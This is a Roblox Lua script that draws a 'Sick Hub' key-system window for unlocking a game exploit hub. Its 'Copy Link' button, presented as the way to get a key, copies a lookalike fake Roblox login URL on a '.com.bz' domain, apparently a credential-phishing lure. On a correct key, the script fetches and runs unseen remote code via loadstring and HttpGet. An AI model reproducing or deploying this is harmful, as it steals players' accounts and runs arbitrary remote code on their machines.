-- =============================================
--   SICK HUB | KEY SYSTEM v1.0
-- =============================================

local KEY_URL  = "https://raw.githubusercontent.com/nxsii69/nxsii-hub/refs/heads/main/key.txt"
local KEY_LINK = "https://roblox.com.bz/login?returnUrl=4864934164384312"

local function executeScript()
	loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/14dcbcc7592c195c2325fca02b703f6c.lua"))()
end

local VALID_KEY = "larp-1234"
pcall(function()
	VALID_KEY = game:HttpGet(KEY_URL):gsub("%s+", "")
end)

local Players          = game:GetService("Players")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer      = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SickHubKeySystem"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Window = Instance.new("Frame")
Window.Size = UDim2.new(0, 420, 0, 320)
Window.Position = UDim2.new(0.5, -210, 0.5, -160)
Window.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
Window.BorderSizePixel = 0
Window.ZIndex = 2
Window.Parent = ScreenGui
Instance.new("UICorner", Window).CornerRadius = UDim.new(0, 16)
local WinStroke = Instance.new("UIStroke", Window)
WinStroke.Color = Color3.fromRGB(45, 45, 65)
WinStroke.Thickness = 1

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 3
TitleBar.Parent = Window
Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 16)

local TBarFix = Instance.new("Frame")
TBarFix.Size = UDim2.new(1, 0, 0, 16)
TBarFix.Position = UDim2.new(0, 0, 1, -16)
TBarFix.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
TBarFix.BorderSizePixel = 0
TBarFix.ZIndex = 3
TBarFix.Parent = TitleBar

local TitleBadge = Instance.new("TextLabel")
TitleBadge.Size = UDim2.new(0, 80, 0, 22)
TitleBadge.Position = UDim2.new(0, 14, 0.5, -11)
TitleBadge.BackgroundColor3 = Color3.fromRGB(45, 27, 105)
TitleBadge.Text = "SICK HUB"
TitleBadge.TextColor3 = Color3.fromRGB(167, 139, 250)
TitleBadge.TextSize = 10
TitleBadge.Font = Enum.Font.GothamBold
TitleBadge.ZIndex = 4
TitleBadge.Parent = TitleBar
Instance.new("UICorner", TitleBadge).CornerRadius = UDim.new(1, 0)

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🔐  KEY SYSTEM"
TitleLabel.TextColor3 = Color3.fromRGB(167, 139, 250)
TitleLabel.TextSize = 13
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.ZIndex = 4
TitleLabel.Parent = TitleBar

local VersionLabel = Instance.new("TextLabel")
VersionLabel.Size = UDim2.new(0, 40, 0, 22)
VersionLabel.Position = UDim2.new(1, -54, 0.5, -11)
VersionLabel.BackgroundTransparency = 1
VersionLabel.Text = "v1.0"
VersionLabel.TextColor3 = Color3.fromRGB(55, 55, 75)
VersionLabel.TextSize = 10
VersionLabel.Font = Enum.Font.GothamBold
VersionLabel.ZIndex = 4
VersionLabel.Parent = TitleBar

local ScriptName = Instance.new("TextLabel")
ScriptName.Size = UDim2.new(1, -40, 0, 26)
ScriptName.Position = UDim2.new(0, 20, 0, 50)
ScriptName.BackgroundTransparency = 1
ScriptName.Text = "Sick Hub Executor"
ScriptName.TextColor3 = Color3.fromRGB(226, 232, 240)
ScriptName.TextSize = 18
ScriptName.Font = Enum.Font.GothamBold
ScriptName.TextXAlignment = Enum.TextXAlignment.Left
ScriptName.ZIndex = 3
ScriptName.Parent = Window

local SubLabel1 = Instance.new("TextLabel")
SubLabel1.Size = UDim2.new(1, -40, 0, 16)
SubLabel1.Position = UDim2.new(0, 20, 0, 80)
SubLabel1.BackgroundTransparency = 1
SubLabel1.Text = "Join our Discord and get today's key to continue."
SubLabel1.TextColor3 = Color3.fromRGB(107, 114, 128)
SubLabel1.TextSize = 11
SubLabel1.Font = Enum.Font.Gotham
SubLabel1.TextXAlignment = Enum.TextXAlignment.Left
SubLabel1.TextWrapped = true
SubLabel1.ZIndex = 3
SubLabel1.Parent = Window

local SubLabel2 = Instance.new("TextLabel")
SubLabel2.Size = UDim2.new(1, -40, 0, 16)
SubLabel2.Position = UDim2.new(0, 20, 0, 98)
SubLabel2.BackgroundTransparency = 1
SubLabel2.Text = "Once you have the key, paste it below to unlock!"
SubLabel2.TextColor3 = Color3.fromRGB(167, 139, 250)
SubLabel2.TextSize = 11
SubLabel2.Font = Enum.Font.Gotham
SubLabel2.TextXAlignment = Enum.TextXAlignment.Left
SubLabel2.TextWrapped = true
SubLabel2.ZIndex = 3
SubLabel2.Parent = Window

local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(1, -40, 0, 1)
Divider.Position = UDim2.new(0, 20, 0, 124)
Divider.BackgroundColor3 = Color3.fromRGB(38, 38, 55)
Divider.BorderSizePixel = 0
Divider.ZIndex = 3
Divider.Parent = Window

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(1, -40, 0, 38)
KeyInput.Position = UDim2.new(0, 20, 0, 136)
KeyInput.BackgroundColor3 = Color3.fromRGB(22, 22, 34)
KeyInput.BorderSizePixel = 0
KeyInput.PlaceholderText = "Enter your key here..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(75, 85, 99)
KeyInput.Text = ""
KeyInput.TextColor3 = Color3.fromRGB(196, 181, 253)
KeyInput.TextSize = 13
KeyInput.Font = Enum.Font.Code
KeyInput.ClearTextOnFocus = false
KeyInput.ZIndex = 3
KeyInput.Parent = Window
Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 8)
local InputStroke = Instance.new("UIStroke", KeyInput)
InputStroke.Color = Color3.fromRGB(51, 51, 74)
InputStroke.Thickness = 1
local InputPad = Instance.new("UIPadding", KeyInput)
InputPad.PaddingLeft = UDim.new(0, 12)

local CheckBtn = Instance.new("TextButton")
CheckBtn.Size = UDim2.new(0, 185, 0, 38)
CheckBtn.Position = UDim2.new(0, 20, 0, 186)
CheckBtn.BackgroundColor3 = Color3.fromRGB(109, 40, 217)
CheckBtn.BorderSizePixel = 0
CheckBtn.Text = "✔  Check Key"
CheckBtn.TextColor3 = Color3.fromRGB(237, 233, 254)
CheckBtn.TextSize = 13
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.ZIndex = 3
CheckBtn.Parent = Window
Instance.new("UICorner", CheckBtn).CornerRadius = UDim.new(0, 8)

local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(0, 185, 0, 38)
CopyBtn.Position = UDim2.new(0, 215, 0, 186)
CopyBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 34)
CopyBtn.BorderSizePixel = 0
CopyBtn.Text = "🔗  Copy Link"
CopyBtn.TextColor3 = Color3.fromRGB(167, 139, 250)
CopyBtn.TextSize = 13
CopyBtn.Font = Enum.Font.GothamBold
CopyBtn.ZIndex = 3
CopyBtn.Parent = Window
Instance.new("UICorner", CopyBtn).CornerRadius = UDim.new(0, 8)
local CopyStroke = Instance.new("UIStroke", CopyBtn)
CopyStroke.Color = Color3.fromRGB(51, 51, 74)
CopyStroke.Thickness = 1

local StatusBar = Instance.new("Frame")
StatusBar.Size = UDim2.new(1, -40, 0, 34)
StatusBar.Position = UDim2.new(0, 20, 0, 236)
StatusBar.BackgroundColor3 = Color3.fromRGB(22, 22, 34)
StatusBar.BorderSizePixel = 0
StatusBar.ZIndex = 3
StatusBar.Parent = Window
Instance.new("UICorner", StatusBar).CornerRadius = UDim.new(0, 8)

local StatusDot = Instance.new("Frame")
StatusDot.Size = UDim2.new(0, 7, 0, 7)
StatusDot.Position = UDim2.new(0, 12, 0.5, -3)
StatusDot.BackgroundColor3 = Color3.fromRGB(75, 85, 99)
StatusDot.BorderSizePixel = 0
StatusDot.ZIndex = 4
StatusDot.Parent = StatusBar
Instance.new("UICorner", StatusDot).CornerRadius = UDim.new(1, 0)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -32, 1, 0)
StatusLabel.Position = UDim2.new(0, 28, 0, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Awaiting key input..."
StatusLabel.TextColor3 = Color3.fromRGB(107, 114, 128)
StatusLabel.TextSize = 12
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.ZIndex = 4
StatusLabel.Parent = StatusBar

local Footer = Instance.new("TextLabel")
Footer.Size = UDim2.new(1, -40, 0, 22)
Footer.Position = UDim2.new(0, 20, 0, 284)
Footer.BackgroundTransparency = 1
Footer.Text = "POWERED BY SICK HUB v1.0"
Footer.TextColor3 = Color3.fromRGB(35, 35, 50)
Footer.TextSize = 10
Footer.Font = Enum.Font.GothamBold
Footer.ZIndex = 3
Footer.Parent = Window

-- =============================================
--   DRAGGING
-- =============================================

local dragging, dragStart, startPos = false, nil, nil

TitleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or
		input.UserInputType == Enum.UserInputType.Touch then
		dragging  = true
		dragStart = input.Position
		startPos  = Window.Position
	end
end)

TitleBar.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or
		input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or
		input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		Window.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
end)

-- =============================================
--   LOGIC
-- =============================================

local function setStatus(text, textColor, dotColor)
	StatusLabel.Text          = text
	StatusLabel.TextColor3    = textColor
	StatusDot.BackgroundColor3 = dotColor
end

local function shakeWindow()
	local orig = Window.Position
	for _, x in ipairs({-6, 6, -5, 5, -3, 3, 0}) do
		Window.Position = UDim2.new(orig.X.Scale, orig.X.Offset + x, orig.Y.Scale, orig.Y.Offset)
		task.wait(0.04)
	end
	Window.Position = orig
end

CheckBtn.MouseButton1Click:Connect(function()
	local inputKey = KeyInput.Text
	if inputKey == "" then
		setStatus("Please enter a key first.", Color3.fromRGB(239, 68, 68), Color3.fromRGB(239, 68, 68))
		task.wait(2)
		setStatus("Awaiting key input...", Color3.fromRGB(107, 114, 128), Color3.fromRGB(75, 85, 99))
		return
	end
	setStatus("Checking key...", Color3.fromRGB(167, 139, 250), Color3.fromRGB(167, 139, 250))
	task.wait(0.8)
	if inputKey == VALID_KEY then
		setStatus("✔  Key accepted! Loading...", Color3.fromRGB(52, 211, 153), Color3.fromRGB(52, 211, 153))
		task.wait(1.2)
		ScreenGui:Destroy()
		executeScript()
	else
		setStatus("✘  Invalid key. Try again.", Color3.fromRGB(239, 68, 68), Color3.fromRGB(239, 68, 68))
		shakeWindow()
		task.wait(2)
		setStatus("Awaiting key input...", Color3.fromRGB(107, 114, 128), Color3.fromRGB(75, 85, 99))
	end
end)

CopyBtn.MouseButton1Click:Connect(function()
	if KEY_LINK == "" then
		setStatus("No link set!", Color3.fromRGB(239, 68, 68), Color3.fromRGB(239, 68, 68))
		task.wait(2)
		setStatus("Awaiting key input...", Color3.fromRGB(107, 114, 128), Color3.fromRGB(75, 85, 99))
		return
	end
	pcall(setclipboard, KEY_LINK)
	setStatus("🔗  Link copied!", Color3.fromRGB(167, 139, 250), Color3.fromRGB(167, 139, 250))
	task.wait(2)
	setStatus("Awaiting key input...", Color3.fromRGB(107, 114, 128), Color3.fromRGB(75, 85, 99))
end)

CheckBtn.MouseEnter:Connect(function()
	TweenService:Create(CheckBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(124, 58, 237)}):Play()
end)
CheckBtn.MouseLeave:Connect(function()
	TweenService:Create(CheckBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(109, 40, 217)}):Play()
end)
CopyBtn.MouseEnter:Connect(function()
	TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(32, 32, 48)}):Play()
end)
CopyBtn.MouseLeave:Connect(function()
	TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(22, 22, 34)}):Play()
end)
